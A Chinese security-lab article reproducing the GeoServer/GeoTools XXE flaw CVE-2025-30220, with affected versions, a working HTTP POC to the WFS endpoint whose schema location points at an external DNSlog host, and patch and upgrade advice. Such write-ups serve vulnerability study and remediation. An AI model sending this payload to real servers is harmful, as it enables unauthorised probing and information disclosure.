#  【成功复现】GeoServer XXE漏洞 (CVE-2025-30220)  
弥天安全实验室  弥天安全实验室   2025-06-23 14:26  
  
#   
  
网安引领时代，弥天点亮未来    
   
  
  
  
  
  
   
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x00写在前面**  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x01漏洞介绍**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDvdqOZcpaib7wQRrZ0CbDJqn5NvJgGnNQwacrZB540jE45Kg1jkDnNRqBHzgDeSsnHYK3ROrZicEQg/640?wx_fmt=png&from=appmsg "")  
  
       
  
GeoServer是GeoServer开源的一个用 Java 编写的开源软件服务器。允许用户共享和编辑地理空间数据。  
  
GeoServer存在代码问题漏洞，该漏洞源于XML外部实体处理不当，可能导致信息泄露。  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x02影响版本**  
  
GeoTools: "29.0<=GeoTools<=31.6, <28.6.1"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDvdqOZcpaib7wQRrZ0CbDJqKJlFSaX6ichQD9d7q75DRJib0XdazrEV7CLSI5K1X3uNwNRxLzcial1tA/640?wx_fmt=png&from=appmsg "")  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x03漏洞复现**  
  
1.访问漏洞环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDvdqOZcpaib7wQRrZ0CbDJqxVEgxFpX2jE6jfPezCW55L4os99IPcPUumxw0qsOQicvF31g9NbLKPA/640?wx_fmt=png&from=appmsg "")  
  
2.对漏洞进行复现  
  
   
**POC**  
  
漏洞复现  
```
POST /geoserver/wfs HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Connection: close
Content-Length: 353
Content-Type: application/xml
Accept-Encoding: gzip

<wfs:GetFeature service="WFS" version="1.0.0"
xmlns:wfs="http://www.opengis.net/wfs"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:topp="http://www.openplans.org/topp"
xsi:schemaLocation="http://a http://xjsackqijs.lfcx.eu.org/xxe.xsd"
outputFormat="KML">
<wfs:Query typeName="topp:states"/>
</wfs:GetFeature>
```  
  
        通过DNSlog回显，判断漏洞存在  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDvdqOZcpaib7wQRrZ0CbDJqBIhcXsSH3q8Eaiby40puicsSKsdKE6D4xZONxQsrWLich9zzTsWMGUTZg/640?wx_fmt=png&from=appmsg "")  
  
  
3.Yakit插件  
测试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDvdqOZcpaib7wQRrZ0CbDJq5Oia2ePfs861mCWDIIKc5tXSyGlRibmnmKHQtr5wYKkIAWmRkBzB30RQ/640?wx_fmt=png&from=appmsg "")  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x04修复建议**  
  
  
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
  
可以使用以下命令查看版本：`mvn dependency:list | grep geotools`。  
  
建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！                       
```
https://geoserver.org/download/
https://github.com/geoserver/geoserver/releases/tag/2.27.1
```  
  
  
  
  
弥天简介  
  
学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
  
口号 网安引领时代，弥天点亮未来  
  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
   
  
  
知识分享完了  
  
喜欢别忘了关注我们哦~  
  
学海浩茫，  
  
予以风动，  
  
必降弥天之润！  
  
  
   弥  天  
  
安全实验室  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
